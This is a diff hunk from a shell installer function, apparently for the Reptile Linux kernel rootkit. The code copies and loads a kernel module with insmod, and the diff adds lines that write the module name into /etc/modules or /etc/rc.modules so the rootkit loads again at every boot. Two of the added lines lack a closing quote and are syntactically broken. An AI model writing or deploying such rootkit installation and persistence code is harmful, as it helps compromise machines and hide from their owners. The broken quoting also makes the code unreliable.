@@ -126,12 +126,12 @@ function reptile_install {
 	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
-        	echo -e "" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -e "" >> /etc/rc.modules && \
+        	echo -e "#<reptile>\nreptile\n#</reptile> >> /etc/rc.modules && \
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
-        #	echo -e "" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        #	echo -e "#<reptile>\nreptile\n#</reptile> >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	fi
     	
 	depmod && insmod /$MODULE/$MODULE.ko && \
